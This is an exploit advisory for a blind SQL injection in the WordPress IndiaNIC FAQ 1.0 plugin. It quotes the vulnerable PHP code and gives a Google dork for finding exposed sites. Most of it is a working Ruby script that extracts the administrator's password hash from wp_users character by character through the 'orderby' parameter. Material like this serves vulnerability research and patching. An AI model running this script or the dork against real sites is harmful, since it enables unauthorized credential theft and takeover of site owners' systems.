# Exploit Title: WordPress IndiaNIC FAQ 1.0 Plugin Blind SQL Injection
# Google Dork: inurl:wp-content/plugins/faqs-manager
# Date: 21.03.2013
# Exploit Author: m3tamantra (http://m3tamantra.wordpress.com/blog)
# Vendor Homepage: http://wordpress.org/extend/plugins/faqs-manager/
# Software Link: http://downloads.wordpress.org/plugin/faqs-manager.zip
# Version: 1.0
# Tested on: Apache/2.2.16 (Debian) PHP 5.3.3-7+squeeze14 with Suhosin-Patch (cli)

##############
# Description:
##############
# The "order" and "orderby" parameter is vulnerable for SQL Injection
# Example URL: http://127.0.0.1:9001/wordpress/wp-admin/admin.php?page=in=
ic_faq&orderby=<sqli>
# PoC take some time to finish (15min on my Testsystem).
# I could speed it up with Multithreading but I'm to lazy right now


#### Vulnerable code part (wp_list_table.php) #############################=
###################################
#
# function prepare_items() {
#  $this->_column_headers = array($this->_columns, $this->_hidden_columns=
, $this->_sortable_columns);
#  $sort_order = isset($_GET['order']) ? $_GET['order'] : "ASC";
#  $orderby_column = isset($_GET['orderby']) ? " ORDER BY {$_GET['orderby=
']} {$sort_order}" : false;
#
#  global $wpdb;
#  if (is_array($this->_sql)) {
#    if ($orderby_column == false) {
#      $data = $this->_sql;
#    } else {
#      $data = $this->_sql;
#      usort($data, array(&$this, 'usort_reorder'));
#    }
#  } else {
#    $data = $wpdb->get_results("{$this->_sql}{$orderby_column}", ARRAY_A=
);
#  }
###########################################################################=
#####################################



#################################
#### Blind SQL Injection PoC ####
#################################
require "net/http"
require "uri"

$target = "" # EDIT ME #
$cookie = "" # EDIT ME # authenticated user session

# Example:
#$target = "http://127.0.0.1:9001/wordpress/"
#$cookie = "wordpress_a6a5d84619ae3f833460b386c064b9e5=admin%7C13640405=
45%7C86475c1a4fe1fc1fa5f1ebb04db1bc8f; wp-settings-1=editor%3Dhtml; wp-se=
ttings-time-1=1363441353; comment_author_a6a5d84619ae3f833460b386c064b9e5=
=tony; comment_author_email_a6a5d84619ae3f833460b386c064b9e5=tony%40bau=
er.de; comment_author_url_a6a5d84619ae3f833460b386c064b9e5=http%3A%2F%2Fs=
ucker.de; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_a6a5=
d84619ae3f833460b386c064b9e5=admin%7C1364040545%7Cd7053b96adaa95745023b91=
694bf30ef; PHPSESSID=1h7f2o5defu6oa8iti6mqnevc7; bp-activity-oldestpage=
=1"

if $target.eql?("") or $cookie.eql?("")
    puts "\n[!]\tPlease set $target and $cookie variable\n"
    raise
end

$chars = ["."] + ("a".."z").to_a + ("A".."Z").to_a + ("0".."9").to_a
$hash = "$P$"
$i = 0 # chars index
$j = 4 # hash index


def sqli_send()
    sqli = URI.escape("(CASE WHEN ((SELECT ASCII(SUBSTRING(user_pass, #{$=
j}, 1)) FROM wp_users WHERE id = 1) = #{$chars[$i].ord}) THEN 1 ELSE 1*=
(SELECT table_name FROM information_schema.tables)END) --")
    uri = URI.parse("#{$target}wp-admin/admin.php?page=inic_faq&orderby=
=#{sqli}")
    http = Net::HTTP.new(uri.host, uri.port)
    #http.set_debug_output($stderr)
    request = Net::HTTP::Get.new(uri.request_uri)
    request["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8;=
 rv:19.0) Gecko/20100101 Firefox/19.0"
    request["Cookie"] = $cookie
    resp = http.request(request)
    if( resp.code != "200" )
        puts "something is wrong response = #{resp.code}"
        raise
    end
    # In WordPress default settings there will no SQL error displayed
    # but when an error apperes we don't get any result.
    # The PoC search for "No record found" and suppose there was an error
    return resp.body().match(/No record found/)=20
end

def print_status()
    output = "HASH: #{$hash} try #{$chars[$i]}"
    print "\b"*output.length + output
end

while( $hash.length < 34 )
    if( !sqli_send() )
        $hash += $chars[$i]
        $j += 1
        $i = 0
    else
        $i += 1
    end
    print_status()
end
puts "\n[+]\thave a nice day :-)\n"
